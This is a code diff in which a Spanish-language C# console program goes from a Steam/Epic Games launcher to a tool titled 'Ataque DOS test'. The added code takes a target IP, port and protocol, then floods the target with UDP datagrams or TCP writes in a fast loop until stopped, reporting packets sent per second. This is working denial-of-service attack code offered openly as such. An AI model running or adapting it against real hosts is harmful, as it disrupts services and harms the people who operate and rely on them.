@@ -1,194 +1,142 @@
-﻿using System;
-using System.Diagnostics;
-using System.IO;
-using System.Threading;
-using Microsoft.Win32;
+﻿using System.Net;
+using System.Net.Sockets;
+using System.Text;
 
-namespace LauncherRodri
+namespace PortWindostool
 {
     class Program
     {
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
-            Console.Title = "Launcher de Juegos";
+            Console.Title = "Ataque DOS test";
             Console.BackgroundColor = ConsoleColor.Black;
             Console.Clear();
-
-    
-            string steamPath = GetSteamExecutablePath();
-            string epicPath = GetEpicGamesLauncherExecutablePath();
-
-            
-            if (string.IsNullOrEmpty(steamPath))
+            WriteColored("Introduce el protocolo (UDP o TCP): ", ConsoleColor.Cyan);
+            string protocol = Console.ReadLine().Trim().ToUpper();
+            while (protocol != "UDP" && protocol != "TCP")
             {
-                WriteColored("No se encontró la ruta de Steam.", ConsoleColor.Red);
-                Console.Write("Introduce la ruta completa de Steam.exe: ");
-                steamPath = Console.ReadLine();
+                WriteColored("Protocolo inválido. Introduce UDP o TCP: ", ConsoleColor.Red);
+                protocol = Console.ReadLine().Trim().ToUpper();
             }
-
-            if (string.IsNullOrEmpty(epicPath))
+            IPAddress parsedIP;
+            string ip;
+            do
             {
-                WriteColored("No se encontró la ruta del Epic Games Launcher.", ConsoleColor.Red);
-                Console.Write("Introduce la ruta completa de EpicGamesLauncher.exe: ");
-                epicPath = Console.ReadLine();
-            }
-
-            bool exit = false;
-            while (!exit)
+                WriteColored("Introduce la dirección IP: ", ConsoleColor.Cyan);
+                ip = Console.ReadLine().Trim();
+                if (!IPAddress.TryParse(ip, out parsedIP))
+                    WriteColored("IP inválida. Inténtalo de nuevo.", ConsoleColor.Red);
+            } while (!IPAddress.TryParse(ip, out parsedIP));
+            int port = 0;
+            bool validPort = false;
+            do
             {
-                Console.Clear();
-                WriteColored("=== Launcher de Juegos ===", ConsoleColor.Yellow);
-                Console.WriteLine();
-                WriteColored("1. Iniciar Steam", ConsoleColor.Cyan);
-                WriteColored("2. Iniciar Epic Games Launcher", ConsoleColor.Cyan);
-                WriteColored("3. Salir", ConsoleColor.Cyan);
-                Console.WriteLine();
-                Console.Write("Elige una opción (1-3): ");
-                string opcion = Console.ReadLine();
-
-                switch (opcion)
+                WriteColored("Introduce el puerto: ", ConsoleColor.Cyan);
+                string portInput = Console.ReadLine().Trim();
+                validPort = int.TryParse(portInput, out port);
+                if (!validPort)
+                    WriteColored("Puerto inválido. Inténtalo de nuevo.", ConsoleColor.Red);
+            } while (!validPort);
+            Console.WriteLine();
+            WriteColored($"Iniciando ataque {protocol} a {ip}:{port}", ConsoleColor.Green);
+            WriteColored("Presiona 'q' para detener el envío de paquetes...", ConsoleColor.Yellow);
+            CancellationTokenSource cts = new CancellationTokenSource();
+            Task sendTask = protocol == "UDP" ? SendUdpPackets(ip, port, cts.Token) : SendTcpPackets(ip, port, cts.Token);
+            Task monitorTask = Task.Run(() =>
+            {
+                while (!cts.Token.IsCancellationRequested)
                 {
-                    case "1":
-                        LaunchProcess(steamPath);
-                        break;
-                    case "2":
-                        LaunchProcess(epicPath);
-                        break;
-                    case "3":
-                        exit = true;
-                        break;
-                    default:
-                        WriteColored("Opción inválida.", ConsoleColor.Red);
-                        break;
+                    if (Console.KeyAvailable)
+                    {
+                        var key = Console.ReadKey(true);
+                        if (key.Key == ConsoleKey.Q)
+                        {
+                            cts.Cancel();
+                        }
+                    }
+                    Thread.Sleep(100);
                 }
-                if (!exit)
+            });
+            await Task.WhenAny(sendTask, monitorTask);
+            Console.WriteLine();
+            WriteColored("Envío cancelado. Presiona cualquier tecla para salir...", ConsoleColor.Magenta);
+            Console.ReadKey();
+        }
+
+        static async Task SendUdpPackets(string ip, int port, CancellationToken token)
+        {
+            using (UdpClient udpClient = new UdpClient())
+            {
+                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
+                byte[] data = Encoding.ASCII.GetBytes("Ataque DOS Test");
+                int counter = 0;
+                DateTime lastUpdate = DateTime.Now;
+                try
                 {
-                    WriteColored("Presiona Enter para continuar...", ConsoleColor.Green);
-                    Console.ReadLine();
+                    while (!token.IsCancellationRequested)
+                    {
+                        await udpClient.SendAsync(data, data.Length, remoteEP);
+                        counter++;
+                        if ((DateTime.Now - lastUpdate).TotalSeconds >= 1)
+                        {
+                            Console.WriteLine();
+                            WriteColored($"Paquetes UDP enviados en el último segundo: {counter}", ConsoleColor.Yellow);
+                            counter = 0;
+                            lastUpdate = DateTime.Now;
+                        }
+                        await Task.Delay(1, token);
+                    }
+                }
+                catch (OperationCanceledException) { }
+                catch (Exception ex)
+                {
+                    WriteColored("Error en UDP: " + ex.Message, ConsoleColor.Red);
                 }
             }
         }
 
-        
+        static async Task SendTcpPackets(string ip, int port, CancellationToken token)
+        {
+            int counter = 0;
+            DateTime lastUpdate = DateTime.Now;
+            try
+            {
+                using (TcpClient tcpClient = new TcpClient())
+                {
+                    WriteColored($"Conectando a {ip}:{port} por TCP...", ConsoleColor.Cyan);
+                    await tcpClient.ConnectAsync(ip, port);
+                    WriteColored("Conexión establecida.", ConsoleColor.Green);
+                    using (NetworkStream stream = tcpClient.GetStream())
+                    {
+                        byte[] data = Encoding.ASCII.GetBytes("Ataque DOS Test");
+                        while (!token.IsCancellationRequested)
+                        {
+                            await stream.WriteAsync(data, 0, data.Length, token);
+                            counter++;
+                            if ((DateTime.Now - lastUpdate).TotalSeconds >= 1)
+                            {
+                                Console.WriteLine();
+                                WriteColored($"Paquetes TCP enviados en el último segundo: {counter}", ConsoleColor.Yellow);
+                                counter = 0;
+                                lastUpdate = DateTime.Now;
+                            }
+                            await Task.Delay(1, token);
+                        }
+                    }
+                }
+            }
+            catch (OperationCanceledException) { }
+            catch (Exception ex)
+            {
+                WriteColored("Error en TCP: " + ex.Message, ConsoleColor.Red);
+            }
+        }
+
         static void WriteColored(string message, ConsoleColor color)
         {
             Console.ForegroundColor = color;
             Console.WriteLine(message);
             Console.ResetColor();
-        }
-
-        
-        static string GetSteamExecutablePath()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
-                {
-                    if (key != null)
-                    {
-                        object value = key.GetValue("SteamPath");
-                        if (value != null)
-                        {
-                            string steamDir = value.ToString();
-                            string exePath = Path.Combine(steamDir, "Steam.exe");
-                            if (File.Exists(exePath))
-                                return exePath;
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                WriteColored("Error obteniendo la ruta de Steam: " + ex.Message, ConsoleColor.Red);
-            }
-            return string.Empty;
-        }
-
-        
-        static string GetEpicGamesLauncherExecutablePath()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Epic Games\EpicGamesLauncher"))
-                {
-                    if (key != null)
-                    {
-                        object value = key.GetValue("AppDataPath") ?? key.GetValue("InstallLocation");
-                        if (value != null)
-                        {
-                            string epicDir = value.ToString();
-                            string exePath = Path.Combine(epicDir, "EpicGamesLauncher.exe");
-                            if (File.Exists(exePath))
-                                return exePath;
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                WriteColored("Error obteniendo la ruta del Epic Games Launcher: " + ex.Message, ConsoleColor.Red);
-            }
-            
-            string defaultEpicPath = @"C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe";
-            return File.Exists(defaultEpicPath) ? defaultEpicPath : string.Empty;
-        }
-
-        
-        static void LaunchProcess(string exePath)
-        {
-            try
-            {
-                string launcherName = Path.GetFileNameWithoutExtension(exePath);
-                
-                Process[] runningProcesses = Process.GetProcessesByName(launcherName);
-                if (runningProcesses.Length > 0)
-                {
-                    WriteColored($"{launcherName} ya está en ejecución.", ConsoleColor.Yellow);
-                    WriteColored("¿Desea cerrarlo y volver a iniciarlo? Presione Enter para confirmar, o cualquier otra tecla para cancelar.", ConsoleColor.Yellow);
-                    var key = Console.ReadKey(true);
-                    if (key.Key == ConsoleKey.Enter)
-                    {
-                        
-                        foreach (var proc in runningProcesses)
-                        {
-                            try { proc.Kill(); }
-                            catch (Exception ex) { WriteColored("Error al cerrar " + launcherName + ": " + ex.Message, ConsoleColor.Red); }
-                        }
-                        WriteColored("Procesos cerrados. Reiniciando...", ConsoleColor.Green);
-                        Thread.Sleep(1000);
-                    }
-                    else
-                    {
-                        WriteColored("Operación cancelada. Cerrando la aplicación.", ConsoleColor.Red);
-                        Environment.Exit(0);
-                    }
-                }
-
-                WriteColored($"Iniciando {launcherName}...", ConsoleColor.Green);
-                Process procNew = Process.Start(exePath);
-                if (procNew != null)
-                {
-                    
-                    Thread.Sleep(3000);
-                    if (!procNew.HasExited)
-                    {
-                        WriteColored($"{launcherName} se está ejecutando. Cerrando el launcher de la consola.", ConsoleColor.Green);
-                        Environment.Exit(0);
-                    }
-                    else
-                    {
-                        WriteColored($"{launcherName} no se inició correctamente.", ConsoleColor.Red);
-                    }
-                }
-                else
-                {
-                    WriteColored("No se pudo iniciar el proceso.", ConsoleColor.Red);
-                }
-            }
-            catch (Exception ex)
-            {
-                WriteColored("Error al iniciar el proceso: " + ex.Message, ConsoleColor.Red);
-            }
         }
     }
 }
